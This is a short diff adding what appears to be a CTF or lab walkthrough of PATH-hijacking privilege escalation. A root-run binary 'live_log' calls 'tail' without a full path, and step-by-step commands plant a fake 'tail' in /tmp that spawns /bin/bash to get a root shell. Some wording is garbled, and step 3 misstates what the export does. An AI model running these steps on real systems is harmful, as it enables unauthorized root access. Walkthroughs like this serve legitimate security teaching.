@@ -1,0 +1,18 @@
+This lane tail -f /var/log/nginx/accessl.logshows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
+
+As this file runs as the root users privileges, we can manipulate our path gain a root shell.
+
+    How to exploit it?
+    1. Create a new directory in /tmp/ folder example :
+    mkdir /tmp/shell
+    2. Go into that folder :
+    cd /tmp/shell
+    3. Change the /usr/bin folder to /tmp/shell
+    export PATH=/tmp/shell:$PATH
+    4. Create a tail file, enter these two commands:
+    echo ‘#!/bin/bash’ > tail
+    echo ‘/bin/bash’ >> tail
+    5. Change the permissions for the tail file
+    chmod +x tail
+    6. Go back to live_log and run the file
+    ./live_log
